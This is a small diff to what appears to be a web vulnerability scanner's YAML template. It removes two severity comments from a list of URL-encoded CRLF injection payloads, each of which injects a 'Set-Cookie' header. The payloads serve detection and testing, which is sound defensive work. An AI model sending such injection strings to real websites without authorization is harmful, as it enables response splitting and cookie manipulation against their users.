@@ -15,7 +15,6 @@ transform:
       - "%0d%20Set-Cookie:crlfinjection=crlfinjection"
       - "%20Set-Cookie:crlfinjection=crlfinjection"
       
-      # Medium payloads
       - "%20%0aSet-Cookie:crlfinjection=crlfinjection"
       - "%20%0dSet-Cookie:crlfinjection=crlfinjection"
       - "%20%0d%0aSet-Cookie:crlfinjection=crlfinjection"
@@ -30,7 +29,6 @@ transform:
       - "%2f..%0d%0aSet-Cookie:crlfinjection=crlfinjection"
       - "%3fSet-Cookie:crlfinjection=crlfinjection"
       
-      # High payloads
       - "%3f%0aSet-Cookie:crlfinjection=crlfinjection"
       - "%3f%0dSet-Cookie:crlfinjection=crlfinjection"
       - "%3f%0d%0aSet-Cookie:crlfinjection=crlfinjection"
